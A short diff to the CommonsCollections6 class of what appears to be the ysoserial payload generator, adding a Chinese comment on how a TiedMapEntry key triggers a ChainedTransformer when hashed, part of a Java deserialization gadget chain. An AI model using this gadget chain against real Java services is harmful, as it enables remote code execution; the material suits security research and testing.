@@ -98,6 +98,9 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
 
         Reflections.setAccessible(keyField);
         keyField.set(node, entry);
+        /*让key成为修改为org.apache.commons.collections.keyvalue
+        .TiedMapEntry对象，因为key会进行hashcode，而TiedMapEntry对象hashcode的时候，会执行ChainedTransformer，ChainedTransformer
+        也可以用Factiory重写来代替，详见我的CC11*/
 
         return map;
 
